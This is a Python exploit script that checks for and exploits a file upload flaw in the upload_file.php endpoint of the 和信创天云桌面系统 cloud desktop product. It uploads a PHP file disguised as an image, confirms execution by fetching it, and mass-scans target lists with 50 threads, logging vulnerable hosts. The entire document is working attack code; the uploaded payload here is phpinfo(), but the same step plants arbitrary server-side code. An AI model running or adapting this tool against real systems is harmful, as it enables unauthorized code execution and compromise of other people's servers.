# 和信创天云桌面系统 upload_file.php文件上传漏洞
import argparse
from multiprocessing.dummy import Pool
import requests
import sys
requests.packages.urllib3.disable_warnings()

#定义横幅


def banner():
    banner = """
██╗    ██╗ █████╗ ████████╗███████╗██████╗ ███╗   ███╗███████╗██╗      ██████╗ ███╗   ██╗
██║    ██║██╔══██╗╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██╔════╝██║     ██╔═══██╗████╗  ██║
██║ █╗ ██║███████║   ██║   █████╗  ██████╔╝██╔████╔██║█████╗  ██║     ██║   ██║██╔██╗ ██║
██║███╗██║██╔══██║   ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║     ██║   ██║██║╚██╗██║
╚███╔███╔╝██║  ██║   ██║   ███████╗██║  ██║██║ ╚═╝ ██║███████╗███████╗╚██████╔╝██║ ╚████║
 ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝                                                                                       
                                                author:watermelon_xz🍉
                                version:和信创天云桌面系统 upload_file.php文件上传漏洞
"""
    print(banner)


#定义主函数
def main():
    #调用横幅
    banner()
    #argparse模块处理命令行参数
    parser = argparse.ArgumentParser(description="和信创天云桌面系统 upload_file.php文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()
    #如果用户输入url而不是file时：
    if args.url and not args.file:
        poc(args.url)
        # if poc(args.url):
        #     exp(args.url)
    #如果用户输入file而不是url时：
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,mode='r',encoding='utf-8') as fr:
            for i in fr.readlines():
                url_list.append(i.strip().replace('\n',''))
                # print(url_list)    
                #设置多线程 
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    #如果用户输入的既不是url也不是file时：
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
             
#定义poc
def poc(target):
    payload = '/Upload/upload_file.php?l=1'
    url = target+payload
    headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36',
    'Accept':'image/avif,image/webp,image/apng,image/*,*/*;q=0.8',
    'Accept-Encoding':'gzip, deflate',
    'Accept-Language':'zh-CN,zh;q=0.9,fil;q=0.8',
    'Cookie':'think_language=zh-cn; PHPSESSID_NAMED=h9j8utbmv82cb1dcdlav1cgdf6',
    'Connection':'close',
    'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv',
    'Content-Length':'188'
         }
    data = (
        '------WebKitFormBoundaryfcKRltGv\r\n'
        'Content-Disposition:form-data; name="file"; filename="indexlist.php"\r\n'
        'Content-Type:image/avif\r\n'
        '\r\n'
        '<?php phpinfo();?>\r\n'
        '------WebKitFormBoundaryfcKRltGv--\r\n'
    )
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }

    #请求网页
    try:
        re = requests.post(url=url,headers=headers,data=data,verify=False,proxies=proxies)
        # print(re.text)
        if re.status_code == 200 and '_Requst' in re.text:
            # print(f'[+++]该{target}和信创天云桌面系统 upload_file.php文件上传漏洞')
            payload1 = '/Upload/1/indexlist.php'
            url1=target+payload1
            # print(url1)
            re1= requests.get(url=url1,verify=False,proxies=proxies)
            # print(re1.text)
            if re1.status_code==200 and 'alt="PHP logo"' in re1.text:
                print(f'[+++]{target}存在和信创天云桌面系统 upload_file.php文件上传漏洞\n文件上传后地址为{url1}')
                with open('result.txt',mode='a',encoding='utf-8')as ft:
                    ft.write(target+'\n')
                return True 
        else:
            print(f'该{target}不存在该漏洞')
    except:
        print(f'该{target}存在问题，请手动测试')


if __name__ == '__main__':
    main()